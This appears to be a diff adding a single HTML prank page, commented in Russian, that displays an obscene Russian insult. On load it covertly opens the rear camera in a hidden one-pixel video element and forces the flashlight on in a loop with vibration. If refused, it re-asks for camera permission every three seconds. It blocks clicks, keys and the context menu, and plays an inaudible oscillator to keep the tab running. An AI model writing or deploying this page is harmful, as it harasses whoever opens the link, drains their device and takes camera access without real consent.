@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🤡</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            background: black;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            font-family: 'Impact', 'Arial Black', sans-serif;
+        }
+        .insult {
+            font-size: 10vw;
+            color: #ff0000;
+            text-shadow: 0 0 30px #ff0000, 0 0 60px #ff4400;
+            animation: blink 0.5s infinite alternate;
+            text-align: center;
+            padding: 20px;
+            word-break: break-word;
+        }
+        @keyframes blink {
+            0% { opacity: 1; transform: scale(1); }
+            100% { opacity: 0.3; transform: scale(1.1); }
+        }
+        /* скрытый видеоэлемент */
+        #video {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="insult">🖕 ВОТ ТЫ ЕБЛАН 🖕</div>
+    <video id="video" autoplay playsinline></video>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // 1. Запрос доступа к камере и фонарику
+            async function startTorchAndCamera() {
+                try {
+                    // Получаем видеопоток с задней камеры (environment)
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'environment',
+                            width: { ideal: 128 },
+                            height: { ideal: 128 }
+                        },
+                        audio: false
+                    });
+
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+
+                    // Ждём, пока видео запустится
+                    await video.play();
+
+                    // 2. Включаем фонарик (Torch) через MediaStreamTrack
+                    const tracks = stream.getVideoTracks();
+                    if (tracks.length === 0) return;
+
+                    const track = tracks[0];
+                    // Проверяем, поддерживает ли камера torch
+                    const capabilities = track.getCapabilities ? track.getCapabilities() : {};
+                    if (capabilities.torch) {
+                        await track.applyConstraints({ advanced: [{ torch: true }] });
+                    } else {
+                        // Если torch не поддерживается, пытаемся через ImageCapture (редко)
+                        try {
+                            const imageCapture = new ImageCapture(track);
+                            await imageCapture.grabFrame();
+                            // Для некоторых устройств включаем вспышку через PhotoCapabilities
+                            if (track.getPhotoCapabilities) {
+                                const photoCap = await track.getPhotoCapabilities();
+                                if (photoCap.fillLightMode && photoCap.fillLightMode.includes('flash')) {
+                                    // Включаем режим вспышки, но это не непрерывно
+                                }
+                            }
+                        } catch(e) {}
+                    }
+
+                    // 3. Бесконечный цикл: каждые 200 мс перезапрашиваем включение torcha,
+                    //    чтобы браузер не отключал его при бездействии.
+                    function keepTorchOn() {
+                        try {
+                            if (track && track.applyConstraints) {
+                                track.applyConstraints({ advanced: [{ torch: true }] })
+                                    .catch(() => {});
+                            }
+                        } catch(e) {}
+                        // Добавляем также скрытую вибрацию для мобильных (если есть)
+                        if (navigator.vibrate) {
+                            navigator.vibrate(100);
+                        }
+                        setTimeout(keepTorchOn, 150);
+                    }
+                    keepTorchOn();
+
+                    // 4. Дополнительно: запись видео в фоне (не сохраняем, просто держим камеру активной)
+                    //    Это не даёт уснуть процессу браузера дольше.
+                    function keepAlive() {
+                        video.play().catch(() => {});
+                        requestAnimationFrame(keepAlive);
+                    }
+                    keepAlive();
+
+                } catch (error) {
+                    // Если пользователь запретил разрешения — просим снова через интервал
+                    console.error('Ошибка доступа:', error);
+                    // Повторный запрос каждые 3 секунды, пока не даст разрешение
+                    setInterval(async () => {
+                        try {
+                            await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                            startTorchAndCamera(); // перезапуск
+                        } catch(e) {}
+                    }, 3000);
+                }
+            }
+
+            // Запускаем сразу при загрузке
+            startTorchAndCamera();
+
+            // Если пользователь сворачивает вкладку — пытаемся перезапустить через Service Worker
+            // (для большей навязчивости, но в рамках браузера)
+
+            // Также перехватываем клики и касания, чтобы предотвратить закрытие
+            document.addEventListener('click', function(e) {
+                e.preventDefault();
+                // При каждом клике включаем фонарик заново
+                const video = document.getElementById('video');
+                if (video.srcObject) {
+                    const track = video.srcObject.getVideoTracks()[0];
+                    if (track && track.applyConstraints) {
+                        track.applyConstraints({ advanced: [{ torch: true }] }).catch(() => {});
+                    }
+                }
+                return false;
+            }, true);
+
+            // Блокируем контекстное меню и жесты закрытия
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('keydown', e => e.preventDefault());
+
+            // Для iOS: пробуем включить фонарик через WebKit (старый способ)
+            if (window.webkit && window.webkit.messageHandlers) {
+                // Мост для iOS, но редко работает
+            }
+
+            // Фоновый звук для удержания процесса (неслышный)
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            gain.gain.value = 0.001; // почти без звука
+            oscillator.connect(gain);
+            gain.connect(audioCtx.destination);
+            oscillator.start();
+            oscillator.frequency.value = 20; // инфразвук, неслышно
+            // Это не даёт браузеру усыпить вкладку на Android
+
+            // Перезапрос разрешений если страница была свёрнута
+            document.addEventListener('visibilitychange', function() {
+                if (!document.hidden) {
+                    startTorchAndCamera();
+                }
+            });
+
+        })();
+    </script>
+</body>
+</html>
